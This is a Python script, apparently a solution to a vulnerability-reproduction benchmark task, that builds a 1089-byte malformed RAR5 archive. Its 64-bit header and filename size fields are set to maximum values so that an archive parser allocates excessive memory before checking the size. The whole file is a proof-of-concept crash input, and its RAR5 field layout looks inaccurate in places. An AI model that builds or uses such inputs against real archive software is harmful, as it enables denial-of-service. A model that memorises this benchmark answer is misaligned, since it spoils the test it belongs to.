import os
import struct
import tempfile
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 constants
        RAR5_SIGNATURE = b'Rar!\x1A\x07\x01\x00'
        RAR5_HEADER_TYPE_FILE = 0x02
        RAR5_HEADER_FLAG_HAS_EXTRA = 0x01
        RAR5_HEADER_FLAG_HAS_DATA = 0x02
        RAR5_HEADER_FLAG_SOLID = 0x10
        
        # Create a minimal RAR5 archive with a file header
        # that has an excessively large filename size field
        data = bytearray()
        
        # Main archive header
        data.extend(RAR5_SIGNATURE)
        
        # File header
        header_data = bytearray()
        
        # Header CRC (placeholder, will calculate later)
        header_data.extend(b'\x00\x00\x00\x00')
        
        # Header size (will be 0xFFFFFFFF to trigger large allocation)
        header_data.extend(struct.pack('<Q', 0xFFFFFFFFFFFFFFFF))
        
        # Header type = file
        header_data.append(RAR5_HEADER_TYPE_FILE)
        
        # Header flags (has extra data)
        header_data.extend(struct.pack('<H', RAR5_HEADER_FLAG_HAS_EXTRA))
        
        # Extra area size (0 for now)
        header_data.extend(struct.pack('<H', 0))
        
        # File attributes (0)
        header_data.extend(struct.pack('<I', 0))
        
        # Modification time (0)
        header_data.extend(struct.pack('<I', 0))
        
        # Unpacked size (0)
        header_data.extend(struct.pack('<Q', 0))
        
        # Data CRC32 (0)
        header_data.extend(struct.pack('<I', 0))
        
        # Compression info (store, no encryption)
        header_data.extend(struct.pack('<H', 0x30))
        
        # Host OS (Windows)
        header_data.append(2)
        
        # Name size - set to extremely large value to trigger excessive allocation
        # This is the key vulnerability: read large size, allocate, then check
        # Using maximum 64-bit value
        name_size = 0xFFFFFFFFFFFFFFFF
        name_bytes = struct.pack('<Q', name_size)
        header_data.extend(name_bytes)
        
        # Actual filename (very short)
        # The vulnerability occurs because the code reads 'name_size' bytes
        # but only checks the size AFTER allocation
        filename = b'A'
        header_data.extend(filename)
        
        # Add padding to reach target length
        # The ground truth length is 1089 bytes, so we pad accordingly
        current_len = len(RAR5_SIGNATURE) + len(header_data)
        if current_len < 1089:
            header_data.extend(b'\x00' * (1089 - current_len))
        
        # Now calculate CRC32 of the header (without the CRC field itself)
        # Skip first 4 bytes which are the CRC placeholder
        crc = zlib.crc32(bytes(header_data[4:])) & 0xFFFFFFFF
        header_data[0:4] = struct.pack('<I', crc)
        
        data.extend(header_data)
        
        # Ensure exactly 1089 bytes
        return bytes(data[:1089])